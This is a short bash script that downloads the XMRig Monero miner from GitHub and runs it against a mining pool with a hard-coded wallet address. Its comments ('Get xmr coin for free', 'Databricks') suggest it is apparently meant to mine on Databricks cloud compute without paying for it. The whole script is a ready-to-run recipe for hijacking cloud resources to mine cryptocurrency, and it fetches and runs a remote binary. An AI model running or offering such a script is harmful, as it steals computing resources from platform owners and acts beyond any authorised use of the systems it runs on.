#! /bin/bash
# Get xmr coin for free
# Databricks
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
tar xvzf xmrig-6.17.0-linux-x64.tar.gz
cd xmrig-6.17.0
./xmrig -o us-west.minexmr.com:443 -u 8BMZo3Y9NTm9nmMyCtgVvJMyN4UKXYnPGLH6Yk4CcAXzMZFPfZcyJJAHnLNr583K4tLu6xXhTqAoETrLnt32FkFwPvNLHwz -k --tls --rig-id aank
